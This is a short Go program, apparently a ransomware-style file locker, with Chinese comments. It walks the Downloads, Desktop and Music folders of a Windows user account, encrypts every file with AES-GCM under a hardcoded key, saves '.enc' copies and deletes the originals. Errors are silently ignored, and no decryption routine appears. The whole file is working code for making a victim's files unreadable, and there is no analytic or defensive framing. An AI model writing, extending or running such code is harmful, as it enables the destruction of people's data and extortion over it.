加密encrypt

package main

import (
	"crypto/aes"
	"crypto/cipher"
	"path/filepath"
	"os"
	"io"
	"crypto/rand"
)

func encryptPath(path string, gcm cipher.AEAD) error {
	return filepath.Walk(path, func(filePath string, info os.FileInfo, err error) error {
		if err != nil {
			
			return err
		}
		// skip if directory
		if !info.IsDir() {
			// encrypt the file
			
			// read file contents
			original, err := os.ReadFile(filePath)
			if err == nil {
				// encrypt bytes
				nonce := make([]byte, gcm.NonceSize())
				if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
					
					return nil
				}
				encrypted := gcm.Seal(nonce, nonce, original, nil)
				// write encrypted contents
				encryptedPath := filePath + ".enc"
				err = os.WriteFile(encryptedPath, encrypted, 0666)
				if err == nil {
					os.Remove(filePath) // delete the original file
					
				} else {
					
				}
			} else {
				
			}
		}
		return nil
	})
}

func main() {
	// Initialize AES in GCM mode
	key := []byte("zzzzxxxxccccvvvvbbbbnnnn")
	block, err := aes.NewCipher(key)
	if err != nil {
		panic("error while setting up aes")
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		panic("error while setting up gcm")
	}

	// 定義兩個路徑
	path1 := `C:\Users\aaaa\Downloads`
	path2 := `C:\Users\aaaa\Desktop`
	path3 := `C:\Users\aaaa\Music`

	// 加密第一個路徑
	
	if err := encryptPath(path1, gcm); err != nil {
		
	}

	// 加密第二個路徑
	
	if err := encryptPath(path2, gcm); err != nil {
		
	}
	// 加密第三個路徑
	
	if err := encryptPath(path3, gcm); err != nil {
		
	}



}
